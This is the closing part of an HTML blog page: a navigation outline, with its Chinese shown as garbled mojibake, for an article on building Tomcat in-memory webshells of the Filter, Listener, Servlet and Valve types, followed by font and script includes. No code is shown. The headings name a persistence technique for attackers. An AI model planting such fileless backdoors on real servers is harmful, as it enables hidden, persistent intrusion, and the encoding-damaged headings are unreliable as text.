        <li><a href="#ä¸€ä¸ªæ­£å¸¸çš„filteræ˜¯å¦‚ä½•è¢«åŠ è½½ä»¥åŠä½¿ç”¨çš„">ä¸€ä¸ªæ­£å¸¸çš„Filteræ˜¯å¦‚ä½•è¢«åŠ è½½ä»¥åŠä½¿ç”¨çš„ï¼Ÿ</a>
          <ul>
            <li><a href="#å¼€å‘è‡ªå®šä¹‰filterç±»">å¼€å‘è‡ªå®šä¹‰Filterç±»</a></li>
            <li><a href="#tomcatåœ¨å¯åŠ¨æ—¶åŠ è½½filter">Tomcatåœ¨å¯åŠ¨æ—¶åŠ è½½Filter</a></li>
            <li><a href="#filterè¿‡æ»¤è¯·æ±‚">Filterè¿‡æ»¤è¯·æ±‚</a></li>
          </ul>
        </li>
        <li><a href="#filterå†…å­˜é©¬çš„æ„é€ ">Filterå†…å­˜é©¬çš„æ„é€ </a></li>
        <li><a href="#å°ç»“">å°ç»“</a></li>
      </ul>
    </li>
    <li><a href="#listenerå‹">Listenerå‹</a>
      <ul>
        <li><a href="#å¼€å‘è‡ªå®šä¹‰listener">å¼€å‘è‡ªå®šä¹‰Listener</a>
          <ul>
            <li><a href="#å¼€å‘listenerç±»">å¼€å‘Listenerç±»</a></li>
            <li><a href="#tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½listenerç±»">Tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½Listenerç±»</a></li>
            <li><a href="#tomcatè°ƒç”¨">Tomcatè°ƒç”¨</a></li>
          </ul>
        </li>
        <li><a href="#æ„é€ listenerå†…å­˜é©¬">æ„é€ Listenerå†…å­˜é©¬</a></li>
      </ul>
    </li>
    <li><a href="#servletå‹">Servletå‹</a>
      <ul>
        <li><a href="#å¼€å‘è‡ªå®šä¹‰servlet">å¼€å‘è‡ªå®šä¹‰Servlet</a>
          <ul>
            <li><a href="#å¼€å‘servletç±»">å¼€å‘Servletç±»</a></li>
            <li><a href="#tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½servletç±»">Tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½Servletç±»</a></li>
            <li><a href="#è°ƒç”¨servlet">è°ƒç”¨Servlet</a></li>
          </ul>
        </li>
        <li><a href="#servletå†…å­˜é©¬">Servletå†…å­˜é©¬</a></li>
      </ul>
    </li>
    <li><a href="#valveå‹">Valveå‹</a>
      <ul>
        <li>
          <ul>
            <li><a href="#pipeline-valve-ç®¡é“-é˜€é—¨è´£ä»»é“¾ç®€ä»‹">Pipeline-Valve ç®¡é“-é˜€é—¨è´£ä»»é“¾ç®€ä»‹</a></li>
            <li><a href="#valveå†…å­˜é©¬">Valveå†…å­˜é©¬</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#å†™åœ¨æœ€å">å†™åœ¨æœ€å</a></li>
    <li><a href="#reference">Reference</a></li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
